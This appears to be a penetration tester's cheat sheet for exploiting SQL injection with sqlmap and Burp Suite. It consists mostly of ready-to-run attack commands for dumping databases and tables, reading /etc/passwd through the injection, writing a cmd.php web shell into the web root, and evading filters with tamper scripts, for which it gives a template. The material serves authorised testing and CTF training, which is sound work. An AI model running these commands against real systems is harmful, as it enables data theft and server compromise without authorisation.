---
title: "SQL Injection"
date: 2025-7-15
tags: ["SQL", "SQL Injection", "MySQL", "Sqlmap", "Nosql", "Sqlite", "SQLi", "Burpsuite", "Database Dumping", "Database"]
---

{{< tab set1 tab1 >}}sqlmap{{< /tab >}}
{{< tabcontent set1 tab1 >}}


#### 1. Copy HTTP Request

```console
+---------------------------------------------------------------+
| In Burp Suite => Right click request => Select `copy to file` |
| Add `*` to the SQL injection point                            |
+---------------------------------------------------------------+
```

#### 2. Initial Enum

```console
# HTTP
sqlmap -r request --batch --banner --proxy=http://127.0.0.1:8080 --level 3 --risk 3 --threads=10
```

```console
# HTTPS
sqlmap -r request --batch --proxy=http://127.0.0.1:8080 --level 3 --risk 3 --threads=10 --force-ssl
```

```console
# String to match when query is evaluated to True
sqlmap -r request --batch --proxy=http://127.0.0.1:8080 --level 3 --risk 3 --threads=10 --string '<STRING>'
```

```console {class="sample-code"}
# e.g. `Invalid User` vs 500 Internal Server Error 
sqlmap -r request --batch --proxy=http://127.0.0.1:8080 --level 3 --risk 3 --threads=10 --string 'Invalid User'
```

```console
# Specify Technique
sqlmap -r request --batch --proxy=http://127.0.0.1:8080 --level 3 --risk 3 --threads=10 --technique <TECHNIQUE>
```

<br>

```console
+------------------------+
| B: Boolean-based blind |
| E: Error-based         |
| U: Union query-based   |
| S: Stacked queries     |
| T: Time-based blind    |
| Q: Inline queries      |
+------------------------+
```

#### 3. Database Enum

```console
# Get Databases
sqlmap -r request --batch --proxy=http://127.0.0.1:8080 --level 3 --risk 3 --threads=10 --dbs
```

```console
# Get Tables
sqlmap -r request --batch --proxy=http://127.0.0.1:8080 --level 3 --risk 3 --threads=10 -D <DB_NAME> --tables
```

```console
# Dump Table
sqlmap -r request --batch --proxy=http://127.0.0.1:8080 --level 3 --risk 3 --threads=10 -D <DB_NAME> -T <TABLE_NAME> --dump
```

```console
# Dump All Tables (Slow)
sqlmap -r request --batch --proxy=http://127.0.0.1:8080 --level 3 --risk 3 --threads=10 -D <DB_NAME> --dump
```

#### 4. Advance

```console
# File Read
sqlmap -r request --batch --proxy=http://127.0.0.1:8080 --level 3 --risk 3 --threads=10 --random-agent --file-read <FILE>
```

```console {class="sample-code"}
sqlmap -r request --batch --proxy=http://127.0.0.1:8080 --level 3 --risk 3 --threads=10 --random-agent --file-read /etc/passwd
```

```console 
# File Write
sqlmap -r request --batch --proxy=http://127.0.0.1:8080 --level 3 --risk 3 --threads=10 --random-agent --file-write <FILE> --file-dest <FILE_DEST>
```

```console {class="sample-code"}
sqlmap -r request --batch --proxy=http://127.0.0.1:8080 --level 3 --risk 3 --threads=10 --random-agent --file-write ./cmd.php --file-dest /var/www/html/cmd.php
```

```console
# Add Payload Tampering Script
sqlmap -r request --batch --proxy=http://127.0.0.1:8080 --level 3 --risk 3 --threads=10 --tamper <TAMPER_SCRIPT>
```

```console {class="sample-code"}
# e.g. randomcase
sqlmap -r request --batch --proxy=http://127.0.0.1:8080 --level 3 --risk 3 --threads=10 --tamper randomcase
```

```console
# Check Privileges
sqlmap -r request --privileges
```

#### tamper.py Template

```python
#!/usr/bin/env python3

from lib.core.enums import PRIORITY
__priority__ = PRIORITY.NORMAL

def dependencies():
    pass

def tamper(payload, **kwargs):
    return payload
```

<small>*Note: Create an empty \_\_init\_\_.py in the same folder*</small>

{{< /tabcontent >}}